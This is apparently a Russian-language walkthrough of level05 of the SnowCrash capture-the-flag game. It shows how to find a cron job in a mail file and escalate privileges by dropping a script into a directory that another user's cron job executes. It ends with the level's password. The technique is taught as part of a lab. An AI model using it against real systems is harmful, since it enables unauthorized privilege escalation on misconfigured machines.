Level05

Передаем команды через апостроф

Пришло письмо.

var — каталог в файловой системе UNIX стандарта FHS, содержащий файлы, которые подвергаются наиболее частому изменению (от англ. variable — переменный) и этот каталог имеет тенденцию к увеличению. Содержит следующие подкаталоги:

cache — кэши различных программ
lock — файлы блокировки для недопустимости одновременного использования одной программы несколькими пользователями
log — файлы системных журналов
tmp — временные файлы. Обычно при выключении компьютера содержимое очищается
lib — информация о различных программах
run — общая информация о состоянии системы с момента последней загрузки, входа в систему и т. д.
spool — очередь печати, факсов, а также входящие почтовые ящики пользователей.
Mail - где мы можем найти письмо.

Содержимое письма:
level05@SnowCrash:/var/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

Проходим по ссылке в письме и видим там код
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

Код получает файл через определённое время как понял по флагу, а дальше запускает его с флагом х, который указывает, чтобы каждая команда оболочки печаталась перед её выполнением для диагностики, а затем по коду удалялась.
Помещаем файл по указанному адресу /opt/openarenaserver/
Создаём файл через touch в /tmp, так как в других местах больше нельзя и закидываем в opt/openarenaserver. Он исчезает.
Тогда единственное что нам остаётся, это закинуть getflag для выполнения и чтобы результат выполнения закинут был в отдельный файл result.
Для этого создаём файл, внутри которого будет написан getflag через апостроф как команда для запуска в скрипте и закидываем его в getflag.sh

 echo 'getflag > /tmp/result' > /tmp/getflag.sh

Где 'getflag' > /tmp/result' - это чтобы скрипт запустил команду getflag и закинул результат в процессе сразу в /tmp/result, чтобы результат не потерялся.

А затем помещаем наш файл в /opt/openarenaserver/
mv /tmp/getflag.sh /opt/openarenaserver/getflag.sh
Дальше ждём когда скрипт обработает и скинет результат в /tmp/result

Password: viuaaale9huek52boumoomioc
